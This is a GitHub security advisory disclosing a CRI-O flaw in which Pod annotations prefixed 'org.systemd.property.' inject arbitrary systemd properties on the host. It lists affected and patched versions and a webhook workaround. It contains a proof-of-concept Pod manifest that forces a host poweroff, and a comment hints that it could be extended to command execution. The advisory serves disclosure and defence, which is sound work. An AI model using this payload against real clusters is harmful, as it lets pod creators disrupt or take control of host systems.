# arbitrary systemd property injection

High

[haircommander](/haircommander)
published
GHSA-2cgq-h8xw-2v5j
Apr 29, 2024

## Package

CRI-O
(CRI-O)

## Affected versions

1.29.3, 1.28.5, 1.27.5

## Patched versions

1.30.0, 1.29.4, 1.28.6, 1.27.6

## Description

### Impact

On CRI-O, it looks like an arbitrary systemd property can be injected via a Pod annotation:

```
---
apiVersion: v1
kind: Pod
metadata:
  name: poc-arbitrary-systemd-property-injection
  annotations:
    # I believe that ExecStart with an arbitrary command works here too,
    # but I haven't figured out how to marshalize the ExecStart struct to gvariant string.
    org.systemd.property.SuccessAction: "'poweroff-force'"
spec:
  containers:
    - name: hello
      image: [quay.io/podman/hello](http://quay.io/podman/hello)

```

This means that any user who can create a pod with an arbitrary annotation may perform an arbitrary action on the host system.

Tested with CRI-O v1.24 on minikube.

I didn't test the latest v1.29 because it is incompatible with minikube: [kubernetes/minikube#18367](https://github.com/kubernetes/minikube/pull/18367)

Thanks to Cédric Clerget (GitHub ID [@cclerget](https://github.com/cclerget)) for finding out that CRI-O just passes pod annotations to OCI annotations:

[opencontainers/runc#3923 (comment)](https://github.com/opencontainers/runc/pull/3923#discussion_r1532292536)

CRI-O has to filter out annotations that have the prefix "org.systemd.property."

* [opencontainers/runc#4217](https://github.com/opencontainers/runc/pull/4217)

### Workarounds

Unfortunately, the only workarounds would involve an external mutating webhook to disallow these annotations
